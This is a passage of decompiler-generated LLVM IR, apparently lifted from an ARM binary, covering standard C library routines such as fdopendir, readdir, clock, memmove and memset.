  br i1 %v2_11978, label %dec_label_pc_11980, label %dec_label_pc_119a0

dec_label_pc_11980:                               ; preds = %dec_label_pc_1195c
  %v0_11990 = call i32 @__aeabi_read_tp()
  %v3_11994 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11994 = sext i16 %v3_11994 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_1199c = add i32 %v4_11994, %v0_11990
  %v4_1199c = inttoptr i32 %v3_1199c to i32*
  store i32 12, i32* %v4_1199c, align 4
  %v0_119a0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_119a0

dec_label_pc_119a0:                               ; preds = %dec_label_pc_1195c, %dec_label_pc_11954, %dec_label_pc_11980
  %v0_119a0 = phi i32 [ %v2_11974, %dec_label_pc_1195c ], [ 0, %dec_label_pc_11954 ], [ %v0_119a0.pre, %dec_label_pc_11980 ]
  store i32 %v3_118f8, i32* @r7, align 4
  ret i32 %v0_119a0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_119a0, { 2, 0, 1 }
}

define i32 @"$d.11"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_119b0:
  %v0_119b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_119b0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_119b0
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_119b0, %bb
  %v4_119b8 = phi i32 [ %arg1, %dec_label_pc_119b0 ], [ 0, %bb ]
  ret i32 %v4_119b8

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_119c0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_119c0, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_119cc = call i32 @fstat()
  store i32 %v0_119cc, i32* @r5, align 4
  %v2_119d0 = icmp eq i32 %v0_119cc, 0
  br i1 %v2_119d0, label %dec_label_pc_119d8, label %dec_label_pc_11a50

dec_label_pc_119d8:                               ; preds = %entry
  %v1_119dc = and i32 %tmp4, 61440
  store i32 %v1_119dc, i32* @r3, align 4
  %v7_119e0 = icmp eq i32 %v1_119dc, 16384
  br i1 %v7_119e0, label %dec_label_pc_11a00, label %dec_label_pc_119e8

dec_label_pc_119e8:                               ; preds = %dec_label_pc_119d8
  %v0_119ec = call i32 @__aeabi_read_tp()
  %v3_119f0 = load i16, i16* @global_var_2222c.358, align 2
  %v0_119f4 = load i32, i32* @r5, align 4
  store i32 %v0_119f4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a34

dec_label_pc_11a00:                               ; preds = %dec_label_pc_119d8
  %v0_11a00 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_11a08 = call i32 @__libc_fcntl(i32 %v0_11a00, i32 3)
  %v7_11a0c = icmp eq i32 %v2_11a08, -1
  br i1 %v7_11a0c, label %dec_label_pc_11a50, label %dec_label_pc_11a14

dec_label_pc_11a14:                               ; preds = %dec_label_pc_11a00
  %v1_11a14 = urem i32 %v2_11a08, 4
  store i32 %v1_11a14, i32* %r3.global-to-local, align 4
  %v7_11a18 = icmp eq i32 %v1_11a14, 1
  br i1 %v7_11a18, label %dec_label_pc_11a20, label %dec_label_pc_11a3c

dec_label_pc_11a20:                               ; preds = %dec_label_pc_11a14
  %v0_11a24 = call i32 @__aeabi_read_tp()
  %v3_11a28 = load i16, i16* @global_var_2222c.358, align 2
  %v0_11a2c = load i32, i32* @r5, align 4
  store i32 %v0_11a2c, i32* %r1.global-to-local, align 4
  %v0_11a30 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a30 = add i32 %v0_11a30, 21
  br label %dec_label_pc_11a34

dec_label_pc_11a34:                               ; preds = %dec_label_pc_119e8, %dec_label_pc_11a20
  %v2_11a34.in = phi i16 [ %v3_119f0, %dec_label_pc_119e8 ], [ %v3_11a28, %dec_label_pc_11a20 ]
  %v1_11a34 = phi i32 [ %v0_119ec, %dec_label_pc_119e8 ], [ %v0_11a24, %dec_label_pc_11a20 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_119e8 ], [ %v1_11a30, %dec_label_pc_11a20 ]
  %v2_11a34 = sext i16 %v2_11a34.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_11a34 = add i32 %v1_11a34, %v2_11a34
  %v4_11a34 = inttoptr i32 %v3_11a34 to i32*
  store i32 %storemerge, i32* %v4_11a34, align 4
  %v0_11a54.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a54

dec_label_pc_11a3c:                               ; preds = %dec_label_pc_11a14
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_11a40 = load i32, i32* @r4, align 4
  %v2_11a44 = call i32 @fd_to_DIR(i32 %v0_11a40, i32 %tmp)
  store i32 %v2_11a44, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a54

dec_label_pc_11a50:                               ; preds = %entry, %dec_label_pc_11a00
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a54

dec_label_pc_11a54:                               ; preds = %dec_label_pc_11a3c, %dec_label_pc_11a34, %dec_label_pc_11a50
  %v0_11a54 = phi i32 [ %v2_11a44, %dec_label_pc_11a3c ], [ %v0_11a54.pre, %dec_label_pc_11a34 ], [ 0, %dec_label_pc_11a50 ]
  ret i32 %v0_11a54

; uselistorder directives
  uselistorder i32 %v1_11a14, { 1, 0 }
  uselistorder i32 %v2_11a08, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 6, 0, 7, 8, 5, 1, 2, 3, 4 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_11a54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a50, { 1, 0 }
  uselistorder label %dec_label_pc_11a34, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_11a6c = load i32, i32* @r4, align 4
  %v6_11a6c = load i32, i32* @r5, align 4
  %v9_11a6c = load i32, i32* @r6, align 4
  %v12_11a6c = load i32, i32* @r7, align 4
  %v15_11a6c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r6, align 4
  %v1_11a80 = add i32 %tmp, 24
  store i32 %v1_11a80, i32* @r4, align 4
  %v4_11a84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 68) to i32*), align 4
  store i32 %v4_11a84, i32* %r1.global-to-local, align 4
  store i32 %v1_11a80, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_11a98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11a98)
  %v0_11aac = load i32, i32* @r6, align 4
  %v2_11aac = add i32 %v0_11aac, 16
  %v3_11aac = inttoptr i32 %v2_11aac to i32*
  %v4_11aac = load i32, i32* %v3_11aac, align 4
  store i32 %v4_11aac, i32* @ip, align 4
  store i32 72376, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11aac)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_11abc

dec_label_pc_11abc:                               ; preds = %dec_label_pc_11aec, %entry
  %v0_11abc = load i32, i32* @r5, align 4
  %v1_11abc = add i32 %v0_11abc, 4
  %v2_11abc = inttoptr i32 %v1_11abc to i32*
  %v3_11abc = load i32, i32* %v2_11abc, align 4
  store i32 %v3_11abc, i32* %r2.global-to-local, align 4
  %v4_11abc = add i32 %v0_11abc, 8
  %v5_11abc = inttoptr i32 %v4_11abc to i32*
  %v6_11abc = load i32, i32* %v5_11abc, align 4
  %tmp10 = icmp ugt i32 %v6_11abc, %v3_11abc
  br i1 %tmp10, label %dec_label_pc_11aec, label %dec_label_pc_11ac8

dec_label_pc_11ac8:                               ; preds = %dec_label_pc_11abc
  %v1_11ac8 = inttoptr i32 %v0_11abc to i32*
  %v2_11ac8 = load i32, i32* %v1_11ac8, align 4
  %v1_11acc = add i32 %v0_11abc, 12
  %v2_11acc = inttoptr i32 %v1_11acc to i32*
  %v3_11acc = load i32, i32* %v2_11acc, align 4
  store i32 %v3_11acc, i32* %r1.global-to-local, align 4
  %v1_11ad0 = add i32 %v0_11abc, 20
  %v2_11ad0 = inttoptr i32 %v1_11ad0 to i32*
  %v3_11ad0 = load i32, i32* %v2_11ad0, align 4
  store i32 %v3_11ad0, i32* %r2.global-to-local, align 4
  %v4_11ad4 = call i32 @__getdents(i32 %v2_11ac8, i32 %v3_11acc, i32 %v3_11ad0, i32 %v6_11abc)
  %tmp9 = icmp slt i32 %v4_11ad4, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_11ae4

.thread:                                          ; preds = %dec_label_pc_11ac8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11b18

dec_label_pc_11ae4:                               ; preds = %dec_label_pc_11ac8
  %v1_11ae4 = load i32, i32* @r5, align 4
  %v2_11ae4 = add i32 %v1_11ae4, 8
  %v3_11ae4 = inttoptr i32 %v2_11ae4 to i32*
  store i32 %v4_11ad4, i32* %v3_11ae4, align 4
  %v0_11ae8 = load i32, i32* @r7, align 4
  %v1_11ae8 = load i32, i32* @r5, align 4
  %v2_11ae8 = add i32 %v1_11ae8, 4
  %v3_11ae8 = inttoptr i32 %v2_11ae8 to i32*
  store i32 %v0_11ae8, i32* %v3_11ae8, align 4
  %v0_11aec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11aec

dec_label_pc_11aec:                               ; preds = %dec_label_pc_11abc, %dec_label_pc_11ae4
  %v1_11afc = phi i32 [ %v0_11abc, %dec_label_pc_11abc ], [ %v0_11aec.pre, %dec_label_pc_11ae4 ]
  %v1_11aec = add i32 %v1_11afc, 4
  %v2_11aec = inttoptr i32 %v1_11aec to i32*
  %v3_11aec = load i32, i32* %v2_11aec, align 4
  store i32 %v3_11aec, i32* %r2.global-to-local, align 4
  %v1_11af0 = add i32 %v1_11afc, 12
  %v2_11af0 = inttoptr i32 %v1_11af0 to i32*
  %v3_11af0 = load i32, i32* %v2_11af0, align 4
  store i32 %v3_11af0, i32* %r1.global-to-local, align 4
  %v2_11af4 = add i32 %v3_11af0, %v3_11aec
  store i32 %v2_11af4, i32* @r4, align 4
  %v1_11af8 = add i32 %v2_11af4, 4
  %v2_11af8 = inttoptr i32 %v1_11af8 to i32*
  %v3_11af8 = load i32, i32* %v2_11af8, align 4
  %v2_11afc = add i32 %v1_11afc, 16
  %v3_11afc = inttoptr i32 %v2_11afc to i32*
  store i32 %v3_11af8, i32* %v3_11afc, align 4
  %v0_11b00 = load i32, i32* @r4, align 4
  %v1_11b00 = add i32 %v0_11b00, 8
  %v2_11b00 = inttoptr i32 %v1_11b00 to i16*
  %v3_11b00 = load i16, i16* %v2_11b00, align 2
  %v4_11b00 = zext i16 %v3_11b00 to i32
  %v0_11b04 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b04 = load i32, i32* %r1.global-to-local, align 4
  %v2_11b04 = add i32 %v1_11b04, %v0_11b04
  %v3_11b04 = inttoptr i32 %v2_11b04 to i32*
  %v4_11b04 = load i32, i32* %v3_11b04, align 4
  store i32 %v4_11b04, i32* %r1.global-to-local, align 4
  %v2_11b08 = add i32 %v0_11b04, %v4_11b00
  %v2_11b0c = icmp eq i32 %v4_11b04, 0
  %v1_11b10 = load i32, i32* @r5, align 4
  %v2_11b10 = add i32 %v1_11b10, 4
  %v3_11b10 = inttoptr i32 %v2_11b10 to i32*
  store i32 %v2_11b08, i32* %v3_11b10, align 4
  br i1 %v2_11b0c, label %dec_label_pc_11abc, label %dec_label_pc_11b18

dec_label_pc_11b18:                               ; preds = %dec_label_pc_11aec, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_11b24 = load i32, i32* @r6, align 4
  %v2_11b24 = add i32 %v0_11b24, 44
  %v3_11b24 = inttoptr i32 %v2_11b24 to i32*
  %v4_11b24 = load i32, i32* %v3_11b24, align 4
  call void @__pseudo_branch(i32 %v4_11b24)
  %v0_11b30 = load i32, i32* @r4, align 4
  store i32 %v3_11a6c, i32* @r4, align 4
  store i32 %v6_11a6c, i32* @r5, align 4
  store i32 %v9_11a6c, i32* @r6, align 4
  store i32 %v12_11a6c, i32* @r7, align 4
  store i32 %v15_11a6c, i32* @lr, align 4
  ret i32 %v0_11b30

; uselistorder directives
  uselistorder i32 %v1_11afc, { 0, 2, 1 }
  uselistorder i32 %v6_11abc, { 1, 0 }
  uselistorder i32 %v0_11abc, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_11aec, { 1, 0 }
}

define i32 @function_11b44(i32 %arg1) local_unnamed_addr {
dec_label_pc_11b44:
  %v0_11b44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11b44, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11b44
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11b44, %bb
  %v4_11b50 = phi i32 [ %arg1, %dec_label_pc_11b44 ], [ 0, %bb ]
  ret i32 %v4_11b50

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_11b54 = load i32, i32* @lr, align 4
  %v0_11b5c = call i32 @__aeabi_read_tp()
  %v3_11b60 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11b60 = sext i16 %v3_11b60 to i32
  %v2_11b64 = add i32 %v4_11b60, %v0_11b5c
  store i32 %v0_11b54, i32* @lr, align 4
  ret i32 %v2_11b64
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_11b78 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11b78, i32* @r0, align 4
  %v1_11b80 = call i32 @times(i32 %v2_11b78)
  %v2_11b84 = load i32, i32* %stack_var_-24, align 4
  %v2_11b88 = add i32 %v2_11b84, %tmp
  %v2_11b90 = mul i32 %v2_11b88, 10000
  %v1_11b94 = and i32 %v2_11b90, 2147483632
  ret i32 %v1_11b94

; uselistorder directives
  uselistorder i32 %v2_11b78, { 1, 0 }
}

define i32 @"$d.10"(i32 %arg1) local_unnamed_addr {
dec_label_pc_11ba4:
  %v0_11ba4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11ba4, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_11ba4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_11ba4, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_11bb0 = call i32 @_memcpy()
  ret i32 %v0_11bb0
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_11bc0 = call i32 @_memcpy()
  ret i32 %v0_11bc0

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_11bd4 = icmp eq i32 %arg3, 8
  store i1 %v8_11bd4, i1* %cpsr_z.global-to-local, align 1
  %v5_11bd8 = icmp slt i32 %arg3, 8
  br i1 %v5_11bd8, label %dec_label_pc_11c38, label %dec_label_pc_11bdc

dec_label_pc_11bdc:                               ; preds = %entry
  %v4_11bdc = mul i32 %arg2, 256
  %v5_11bdc = or i32 %v4_11bdc, %arg2
  %v4_11be0 = mul i32 %v5_11bdc, 65536
  %v5_11be0 = or i32 %v4_11be0, %v5_11bdc
  store i32 %v5_11be0, i32* @r1, align 4
  %v1_11be457 = urem i32 %tmp, 4
  %v2_11be458 = icmp eq i32 %v1_11be457, 0
  store i1 %v2_11be458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_11be458, label %dec_label_pc_11bf4, label %bb

bb:                                               ; preds = %dec_label_pc_11bdc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_11bdc ]
  %v3_11be859 = phi i32 [ %v6_11be8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_11bdc ]
  %v4_11be8 = inttoptr i32 %v3_11be859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11be8, align 1
  %v5_11be8 = load i32, i32* @r3, align 4
  %v6_11be8 = add i32 %v5_11be8, 1
  store i32 %v6_11be8, i32* @r3, align 4
  %v0_11bec.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11bf8.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_11bec.pr, label %dec_label_pc_11bf4, label %.thread

.thread:                                          ; preds = %bb
  %v2_11bec = add i32 %v0_11bf8.pr.pre, -1
  store i32 %v2_11bec, i32* %r2.global-to-local, align 4
  %v1_11be4 = urem i32 %v6_11be8, 4
  %v2_11be4 = icmp eq i32 %v1_11be4, 0
  store i1 %v2_11be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11be4, label %dec_label_pc_11bf4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11be8.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_11be8.pre to i8
  br label %bb

dec_label_pc_11bf4:                               ; preds = %.thread, %bb, %dec_label_pc_11bdc
  %v0_11c0028 = phi i32 [ %tmp, %dec_label_pc_11bdc ], [ %v6_11be8, %bb ], [ %v6_11be8, %.thread ]
  %v0_11bf8.pr = phi i32 [ %arg3, %dec_label_pc_11bdc ], [ %v0_11bf8.pr.pre, %bb ], [ %v2_11bec, %.thread ]
  %v0_11bf4 = load i32, i32* @r1, align 4
  store i32 %v0_11bf4, i32* %ip.global-to-local, align 4
  %v8_11bf810 = icmp eq i32 %v0_11bf8.pr, 8
  store i1 %v8_11bf810, i1* %cpsr_z.global-to-local, align 1
  %v5_11bfc11 = icmp slt i32 %v0_11bf8.pr, 8
  br i1 %v5_11bfc11, label %dec_label_pc_11c38, label %dec_label_pc_11c00.preheader

dec_label_pc_11c00.preheader:                     ; preds = %dec_label_pc_11bf4
  %v1_11c0046 = inttoptr i32 %v0_11c0028 to i32*
  store i32 %v0_11bf4, i32* %v1_11c0046, align 4
  %v3_11c0047 = add i32 %v0_11c0028, 4
  %v4_11c0048 = inttoptr i32 %v3_11c0047 to i32*
  %v5_11c0049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c0049, i32* %v4_11c0048, align 4
  %v6_11c0050 = add i32 %v0_11c0028, 8
  store i32 %v6_11c0050, i32* @r3, align 4
  %v0_11c0451 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c0452 = add i32 %v0_11c0451, -8
  store i32 %v1_11c0452, i32* %r2.global-to-local, align 4
  %v5_11c0c53 = icmp slt i32 %v1_11c0452, 8
  br i1 %v5_11c0c53, label %dec_label_pc_11c00.dec_label_pc_11c38.loopexit_crit_edge, label %dec_label_pc_11c10

dec_label_pc_11c10:                               ; preds = %dec_label_pc_11c00.preheader, %dec_label_pc_11bf8.dec_label_pc_11c00_crit_edge
  %v6_11c0055 = phi i32 [ %v6_11c00, %dec_label_pc_11bf8.dec_label_pc_11c00_crit_edge ], [ %v6_11c0050, %dec_label_pc_11c00.preheader ]
  %v0_11c0054 = phi i32 [ %v12_11c2c, %dec_label_pc_11bf8.dec_label_pc_11c00_crit_edge ], [ %v0_11c0028, %dec_label_pc_11c00.preheader ]
  %v1_11c10 = inttoptr i32 %v6_11c0055 to i32*
  %v2_11c10 = load i32, i32* @r1, align 4
  store i32 %v2_11c10, i32* %v1_11c10, align 4
  %v3_11c10 = add i32 %v0_11c0054, 12
  %v4_11c10 = inttoptr i32 %v3_11c10 to i32*
  %v5_11c10 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c10, i32* %v4_11c10, align 4
  %v6_11c10 = add i32 %v0_11c0054, 16
  store i32 %v6_11c10, i32* @r3, align 4
  %v0_11c14 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c14 = add i32 %v0_11c14, -8
  store i32 %v1_11c14, i32* %r2.global-to-local, align 4
  %v5_11c1c = icmp slt i32 %v1_11c14, 8
  br i1 %v5_11c1c, label %dec_label_pc_11c10.dec_label_pc_11c38.loopexit_crit_edge, label %dec_label_pc_11c20

dec_label_pc_11c20:                               ; preds = %dec_label_pc_11c10
  %v1_11c20 = inttoptr i32 %v6_11c10 to i32*
  %v2_11c20 = load i32, i32* @r1, align 4
  store i32 %v2_11c20, i32* %v1_11c20, align 4
  %v3_11c20 = add i32 %v0_11c0054, 20
  %v4_11c20 = inttoptr i32 %v3_11c20 to i32*
  %v5_11c20 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c20, i32* %v4_11c20, align 4
  %v6_11c20 = add i32 %v0_11c0054, 24
  store i32 %v6_11c20, i32* @r3, align 4
  %v0_11c24 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c24 = add i32 %v0_11c24, -8
  store i32 %v1_11c24, i32* %r2.global-to-local, align 4
  %v5_11c2c = icmp slt i32 %v1_11c24, 8
  br i1 %v5_11c2c, label %dec_label_pc_11c20.dec_label_pc_11c38.loopexit_crit_edge, label %dec_label_pc_11bf8

dec_label_pc_11bf8:                               ; preds = %dec_label_pc_11c20
  %v7_11c2c = inttoptr i32 %v6_11c20 to i32*
  %v8_11c2c = load i32, i32* @r1, align 4
  store i32 %v8_11c2c, i32* %v7_11c2c, align 4
  %v9_11c2c = add i32 %v0_11c0054, 28
  %v10_11c2c = inttoptr i32 %v9_11c2c to i32*
  %v11_11c2c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_11c2c, i32* %v10_11c2c, align 4
  %v12_11c2c = add i32 %v0_11c0054, 32
  store i32 %v12_11c2c, i32* @r3, align 4
  %v6_11c30 = load i32, i32* %r2.global-to-local, align 4
  %v7_11c30 = add i32 %v6_11c30, -8
  store i32 %v7_11c30, i32* %r2.global-to-local, align 4
  %v5_11bfc = icmp slt i32 %v7_11c30, 8
  br i1 %v5_11bfc, label %dec_label_pc_11bf8.dec_label_pc_11c38.loopexit_crit_edge, label %dec_label_pc_11bf8.dec_label_pc_11c00_crit_edge

dec_label_pc_11bf8.dec_label_pc_11c00_crit_edge:  ; preds = %dec_label_pc_11bf8
  %v2_11c00.pre = load i32, i32* @r1, align 4
  %v1_11c00 = inttoptr i32 %v12_11c2c to i32*
  store i32 %v2_11c00.pre, i32* %v1_11c00, align 4
  %v3_11c00 = add i32 %v0_11c0054, 36
  %v4_11c00 = inttoptr i32 %v3_11c00 to i32*
  %v5_11c00 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c00, i32* %v4_11c00, align 4
  %v6_11c00 = add i32 %v0_11c0054, 40
  store i32 %v6_11c00, i32* @r3, align 4
  %v0_11c04 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c04 = add i32 %v0_11c04, -8
  store i32 %v1_11c04, i32* %r2.global-to-local, align 4
  %v5_11c0c = icmp slt i32 %v1_11c04, 8
  br i1 %v5_11c0c, label %dec_label_pc_11c00.dec_label_pc_11c38.loopexit_crit_edge, label %dec_label_pc_11c10

dec_label_pc_11bf8.dec_label_pc_11c38.loopexit_crit_edge: ; preds = %dec_label_pc_11bf8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c38

dec_label_pc_11c00.dec_label_pc_11c38.loopexit_crit_edge: ; preds = %dec_label_pc_11bf8.dec_label_pc_11c00_crit_edge, %dec_label_pc_11c00.preheader
  %v1_11c04.lcssa = phi i32 [ %v1_11c0452, %dec_label_pc_11c00.preheader ], [ %v1_11c04, %dec_label_pc_11bf8.dec_label_pc_11c00_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c38

dec_label_pc_11c10.dec_label_pc_11c38.loopexit_crit_edge: ; preds = %dec_label_pc_11c10
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c38

dec_label_pc_11c20.dec_label_pc_11c38.loopexit_crit_edge: ; preds = %dec_label_pc_11c20
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c38

dec_label_pc_11c38:                               ; preds = %dec_label_pc_11bf4, %dec_label_pc_11bf8.dec_label_pc_11c38.loopexit_crit_edge, %dec_label_pc_11c00.dec_label_pc_11c38.loopexit_crit_edge, %dec_label_pc_11c10.dec_label_pc_11c38.loopexit_crit_edge, %dec_label_pc_11c20.dec_label_pc_11c38.loopexit_crit_edge, %entry
  %v0_11c40 = phi i32 [ %arg3, %entry ], [ %v1_11c24, %dec_label_pc_11c20.dec_label_pc_11c38.loopexit_crit_edge ], [ %v1_11c14, %dec_label_pc_11c10.dec_label_pc_11c38.loopexit_crit_edge ], [ %v1_11c04.lcssa, %dec_label_pc_11c00.dec_label_pc_11c38.loopexit_crit_edge ], [ %v7_11c30, %dec_label_pc_11bf8.dec_label_pc_11c38.loopexit_crit_edge ], [ %v0_11bf8.pr, %dec_label_pc_11bf4 ]
  %v2_11c38 = icmp eq i32 %v0_11c40, 0
  store i1 %v2_11c38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c38, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11c38
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11c38
  %v1_11c40 = sub i32 7, %v0_11c40
  store i32 %v1_11c40, i32* %r2.global-to-local, align 4
  %v3_11c44 = mul i32 %v1_11c40, 4
  %v4_11c44 = add i32 %v3_11c44, ptrtoint (i32* @global_var_11c4c.400 to i32)
  call void @__pseudo_branch(i32 %v4_11c44)
  %v0_11c4c = load i32, i32* @r1, align 4
  %v1_11c4c = trunc i32 %v0_11c4c to i8
  %v2_11c4c = load i32, i32* @r3, align 4
  %v3_11c4c = inttoptr i32 %v2_11c4c to i8*
  store i8 %v1_11c4c, i8* %v3_11c4c, align 1
  %v4_11c4c = load i32, i32* @r3, align 4
  %v5_11c4c = add i32 %v4_11c4c, 1
  store i32 %v5_11c4c, i32* %r3.global-to-local, align 4
  %v0_11c50 = load i32, i32* @r1, align 4
  %v1_11c50 = trunc i32 %v0_11c50 to i8
  %v3_11c50 = inttoptr i32 %v5_11c4c to i8*
  store i8 %v1_11c50, i8* %v3_11c50, align 1
  %v4_11c50 = load i32, i32* %r3.global-to-local, align 4
  %v5_11c50 = add i32 %v4_11c50, 1
  store i32 %v5_11c50, i32* %r3.global-to-local, align 4
  %v0_11c54 = load i32, i32* @r1, align 4
  %v1_11c54 = trunc i32 %v0_11c54 to i8
  %v3_11c54 = inttoptr i32 %v5_11c50 to i8*
  store i8 %v1_11c54, i8* %v3_11c54, align 1
  %v4_11c54 = load i32, i32* %r3.global-to-local, align 4
  %v5_11c54 = add i32 %v4_11c54, 1
  store i32 %v5_11c54, i32* %r3.global-to-local, align 4
  %v0_11c58 = load i32, i32* @r1, align 4
  %v1_11c58 = trunc i32 %v0_11c58 to i8
  %v3_11c58 = inttoptr i32 %v5_11c54 to i8*
  store i8 %v1_11c58, i8* %v3_11c58, align 1
  %v4_11c58 = load i32, i32* %r3.global-to-local, align 4
  %v5_11c58 = add i32 %v4_11c58, 1
  store i32 %v5_11c58, i32* %r3.global-to-local, align 4
  %v0_11c5c = load i32, i32* @r1, align 4
  %v1_11c5c = trunc i32 %v0_11c5c to i8
  %v3_11c5c = inttoptr i32 %v5_11c58 to i8*
  store i8 %v1_11c5c, i8* %v3_11c5c, align 1
  %v4_11c5c = load i32, i32* %r3.global-to-local, align 4
  %v5_11c5c = add i32 %v4_11c5c, 1
  store i32 %v5_11c5c, i32* %r3.global-to-local, align 4
  %v0_11c60 = load i32, i32* @r1, align 4
  %v1_11c60 = trunc i32 %v0_11c60 to i8
  %v3_11c60 = inttoptr i32 %v5_11c5c to i8*
  store i8 %v1_11c60, i8* %v3_11c60, align 1
  %v4_11c60 = load i32, i32* %r3.global-to-local, align 4
  %v5_11c60 = add i32 %v4_11c60, 1
  store i32 %v5_11c60, i32* %r3.global-to-local, align 4
  %v0_11c64 = load i32, i32* @r1, align 4
  %v1_11c64 = trunc i32 %v0_11c64 to i8
  %v3_11c64 = inttoptr i32 %v5_11c60 to i8*
